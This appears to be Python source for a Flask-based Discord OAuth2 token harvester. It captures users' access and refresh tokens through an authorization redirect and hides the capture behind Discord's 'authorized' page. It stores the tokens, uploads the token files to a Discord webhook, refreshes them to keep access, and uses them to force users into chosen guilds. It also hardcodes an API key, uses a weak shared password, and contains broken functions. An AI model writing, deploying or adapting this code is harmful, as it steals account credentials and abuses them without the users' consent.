
import os, threading
import json, requests, time
from dhooks import Webhook, File
from flask import Flask, redirect, url_for, request

CLIENT_ID = ""
tkn = ""
CLIENT_SECRET = ""
REDIRECT_URI = '' 






app = Flask(__name__)
verified_redirect = ""
verifier_redir = ""
hook = ""



API_ENDPOINT = 'https://canary.discord.com/api/v9'

 #
TOKEN_FINDER_API = "https://"
TOKEN_FINDER_API_AUTH = "02ab23b5df4ff52f46320e92d7"
backup_hook = ""
pwd = "ok"


def exchange_code(code):
  while True:
    data = {
      'client_id': CLIENT_ID,
      'client_secret': CLIENT_SECRET,
      'grant_type': 'authorization_code',
      'code': code,
      'redirect_uri': REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(str(API_ENDPOINT) + '/oauth2/token',
                      data=data,
                      headers=headers)
    print(r.text)
    if r.status_code in (200, 201, 204):
      print(r.json())
      return r.json()
    elif r.status_code == 429:
      time.sleep(r.json()['retry_after'])
      continue
    else:
      return False


def add_to_guild(userID, access_token, guild_Id):
  return "ok"
  url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"

  botToken = tkn
  data = {
    "access_token": access_token,
  }
  headers = {
    "Authorization": f"Bot {botToken}",
    'Content-Type': 'application/json'
  }
  r = requests.put(url=url, headers=headers, json=data)
  print(r.status_code)
  print(r.text)
  print(response.status_code)
  print(REDIRECT_URI)
  r = requests.post(
  hook, json={"content": f"successfully added user <@{userID}> | {userID}"})
  headers={"Authorization": f"Bot {tkn}"}
  return r.status_code


# f = open("backup.txt", "r").readlines()
# for line in f:
#   if "\n" in line:
#     line = line.replace("\n", "")
#     line = line.split(":")
#     threading.Thread(target=add_to_guild, args=(line[0], line[1], "952495772073619466")).start()
# print(line[0], line[1])


def get_user(access: str):
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {access}"})
  rjson = r.json()
  return rjson['id']


def get_new_token(refresh):
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh
  }
  r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
  if r.status_code in (200, 201, 204):
    return r.json()
  return "failed"


# code = exchange_code('gvxPfY7M80idbUgN6YfwJPUIEuP2kv')['access_token']
# add_to_guild(access_token="9csiMPR9reOxjDJCxEc1z7oZJwNiUm", userID="661563598711291904" , guild_Id="1028633555972145183")
# @app.route('/')
# def main():
#   return redirect("https://discord.com/invite/spy", code=302)


# def handler(code: str):
def save(id, access_tk, refresh_tk):
  ok = "%s:%s:%s" % (id, access_tk, refresh_tk)
  f2 = open("database.txt", "r")
  f2r = f2.read()
  if ok in f2r:
    print(ok, "Already in")
    return
  f = open("database.txt", "a")
  f.write("%s:%s:%s\n" % (id, access_tk, refresh_tk))
  print("%s:%s:%s\n" % (id, access_tk, refresh_tk))


def test():
  print("works")


@app.route("/backup", methods=['POST'])
def backup():
  limiter = "not set yet"
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  try:
    sender = Webhook(backup_hook)
    file1 = File("Database/access_tokens.json", name="access.txt")
    file2 = File("Database/refresh_tokens.json", name="refresh.txt")
    sender.send("access", file=file1)
    sender.send("refresh", file=file2)
    return "success"
  except Exception as e:
    # print(e)
    return "failed\n %s" % (e)
  else:
    return "unauthorized"


# backup()
@app.route("/pullsingle", methods=["get"])
def pullsingle():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json
  user = jsonxd["user"]
  f = open("Database/access_tokens.json", "r").read()
  f = json.loads(f)
  try:
    tk = f[user]
  except KeyError:
    return "dberr"
  print(tk)
  return tk


@app.route("/refreshsingle", methods=["put"])
def refreshsingle():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json
  user = jsonxd["user"]
  f = open("Database/refresh_tokens.json", "r").read()
  f = json.loads(f)
  try:
    tk = f[user]
  except:
    return "this user is not in database"
  print(tk)
  r = get_new_token(tk)
  if r == "failed":
    return "failed"
  access = r["access_token"]
  refresh = r["refresh_token"]
  save(user, access, refresh)
  return "success"


@app.route("/pull", methods=['POST'])
def pull():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json
  guild = jsonxd['guild']
  access = open('Database/access_tokens.json', 'r').read()
  access = json.loads(access)
  added = 0
  failed = 0
  for key in access:
    value = access[key]
    print(key, value)
    r = add_to_guild(value, key, guild)
    if r in (200, 201, 204):
      added += 1
    else:
      failed += 1
  return "success\n %s\n\nfailed\n %s" % (added, failed)


@app.route("/members", methods=['GET'])
def members():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  access = open("Database/access_tokens.json").readlines()
  # access = json.loads(access)
  return str(len(access))


def refresh_all():
  refresh = open("Database/refresh_tokens.json").read()
  refresh = json.loads(refresh)
  for key in refresh:
    value = refresh[key]
    r = get_new_token(value)  # commented to avoid massacres
    new_access = r["access_token"]
    new_refresh = r["refresh_token"]
    f = open("backup.txt", "a")
    f.write("%s:%s:%s" % (key, new_access, new_refresh))
    print("%s:%s:%s" % (key, new_access, new_refresh))
    save(key, new_access, new_refresh)


@app.route("/refresh", methods=['POST'])
def refresh():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  return "failed"
  # access = open("access_tokens.json").read()
  refresh_all()
  return "200"


@app.route("/check", methods=['get'])
def check():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json
  # print(jsonxd)
  user = jsonxd['user']
  f = open("Database/access_tokens.json", "r").read()
  f = json.loads(f)
  try:
    tk = f[user]
    # print(tk)
  except KeyError:
    return "entry %s not found" % (user)
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {tk}"})
  rjson = r.json()
  print(rjson)
  return "entry found: \n\n%s" % (rjson)


@app.route('/usr/passwd')
def hello_world():
  ip_addr = request.remote_addr
  return "trolled"


  # return '<h1> Your IP address is:' + ip_addr
@app.route('/')
def process_json():
  # os.system("clear")
  # test()
  # redirect("https://discord.com/invite/spy", code=302)
  args = request.args
  if "code" not in args:
    return redirect(verifier_redir, code=302)
  idk = args.get('code')
  idk = str(idk)
  # print(idk)
  # handler(idk)
  try:
    # print("testing")
    exchange = exchange_code(idk)
    if exchange == False:
      return redirect("https://discord.com/oauth2/authorized", code=302)
    # print(exchange)
    access_tk = exchange['access_token']
    # print(access_tk)
    refresh_tk = exchange['refresh_token']
    # print(refresh_tk)
    id = get_user(access_tk)
    # print(id)
    save(id, access_tk, refresh_tk)
    # Sliding Code to Token Finder API
  except:
    return redirect("https://discord.com/oauth2/authorized", code=302)
  # try:
  #   # add_to_guild(str(access_tk), str(id), "952495772073619466")
  # except:
  #   pass
  return redirect("https://discord.com/oauth2/authorized", code=302)
  # content_type = request.headers.get('Content-Type')
  # if (content_type == 'application/json'):
  # json = request.json
  # # return 200
  # print(json)
  # print(request.headers)
  # user = json["user"]
  # guild = json["guild"]
  # verify(user)


if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
